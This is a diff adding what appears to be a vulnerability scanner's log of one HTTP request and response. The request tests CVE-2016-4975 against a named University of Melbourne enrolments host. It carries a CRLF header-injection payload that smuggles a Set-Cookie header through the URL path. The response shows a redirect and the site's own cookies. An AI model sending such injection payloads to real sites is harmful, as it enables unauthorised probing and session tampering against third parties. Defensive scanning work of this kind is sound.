@@ -1,0 +1,27 @@
+[CVE-2016-4975] Dumped HTTP request for https://enrolments.hildas.unimelb.edu.au/~user/%0D%0ASet-Cookie:crlfinjection
+
+
+GET /~user/%0D%0ASet-Cookie:crlfinjection HTTP/1.1
+Host: enrolments.hildas.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2016-4975] Dumped HTTP response https://enrolments.hildas.unimelb.edu.au/~user/%0D%0ASet-Cookie:crlfinjection
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://enrolments.hildas.unimelb.edu.au/~user/%0D%0ASet-Cookie:crlfinjection
+Set-Cookie: visid_incap_3211538=cOwZDU+lSgaDwXt/vBXWEwxyk2gAAAAAQUIPAAAAAABiSkktH2Aj4ombAY6G9qKj; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.hildas.unimelb.edu.au
+Set-Cookie: incap_ses_237_3211538=m9BjPL0t51Wc6barov5JAwxyk2gAAAAAsRqErq7Ao+Df56N9FyLuWg==; path=/; Domain=.hildas.unimelb.edu.au
+X-Iinfo: 8-4189730-0 0NNN RT(1754493453270 48) q(0 -1 -1 -1) r(0 -1) B13(3,901872,0) U25
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
